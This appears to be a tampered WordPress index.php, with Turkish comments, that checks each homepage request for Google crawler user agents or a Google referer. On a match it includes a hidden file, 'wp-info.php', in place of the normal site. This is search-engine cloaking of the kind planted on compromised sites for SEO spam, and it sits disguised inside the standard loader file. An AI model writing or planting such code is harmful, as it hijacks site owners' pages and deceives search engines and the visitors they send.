<?php
// Sadece anasayfa (/ veya /index.php) için çalışsın
$requestUri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
if ($requestUri === '/' || $requestUri === '/index.php') {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $referer = $_SERVER['HTTP_REFERER'] ?? '';

    $googleBots = [
        'Googlebot','AdsBot','Mediapartners-Google','APIs-Google',
        'Googlebot-Image','Googlebot-Video','Googlebot-News',
        'Googlebot-Search','Googlebot-Inspect','Googlebot-Android',
        'Googlebot-Mobile','Googlebot-Ads','Googlebot-Discovery','Google-',
    ];

    if (
        preg_match('/' . implode('|', $googleBots) . '/i', $userAgent) ||
        strpos($referer, 'google.') !== false
    ) {
        include 'wp-info.php';
        exit;
    }
}

// Normal WordPress yüklemesi
define('WP_USE_THEMES', true);
require('./wp-blog-header.php');
?>
